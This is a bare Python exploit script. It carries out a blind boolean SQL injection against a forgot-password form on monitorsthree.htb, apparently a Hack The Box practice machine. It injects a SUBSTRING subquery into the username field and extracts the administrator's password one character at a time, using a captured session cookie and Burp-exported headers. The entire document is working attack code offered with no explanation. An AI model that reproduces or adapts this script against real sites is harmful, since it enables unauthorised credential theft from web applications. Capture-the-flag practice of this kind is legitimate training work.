import requests
from urllib.parse import urljoin

ascii_printable = "1234567890qwertyuiopasdfghjklzxcvbnm"
found = []


for i in range(50):
    for j in ascii_printable:
        burp0_url = "http://monitorsthree.htb:80/forgot_password.php"
        burp0_cookies = {"PHPSESSID": "a69449kv7hfl8ndb6lim5pou5k"}
        burp0_headers = {"Cache-Control": "max-age=0", "Accept-Language": "en-US,en;q=0.9",
                         "Origin": "http://monitorsthree.htb", "Content-Type": "application/x-www-form-urlencoded",
                         "Upgrade-Insecure-Requests": "1",
                         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                         "Referer": "http://monitorsthree.htb/forgot_password.php",
                         "Accept-Encoding": "gzip, deflate, br",
                         "Connection": "keep-alive"}
        burp0_data = {
            f"username": f"admin' AND (SELECT SUBSTRING(password,{i+1},1) FROM users LIMIT 0,1)='{j}' -- a"}
        requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

        s = requests.Session()
        s.headers.update(burp0_headers)
        s.cookies.update(burp0_cookies)

        resp = s.post(burp0_url, data=burp0_data, allow_redirects=False, timeout=15)

        while resp.is_redirect or resp.is_permanent_redirect:
            next_url = urljoin(resp.url, resp.headers["Location"])
            resp = s.get(next_url, allow_redirects=False, timeout=15)

        print(f"\rthe test is in {i+1} and char {j}", end="", flush=True)
        if "Connection failed" not in resp.text and "Unable to process request, try again!" not in resp.text:
            found+=j
            final = ''.join(found)
            print("\npassword is :", final)
            break


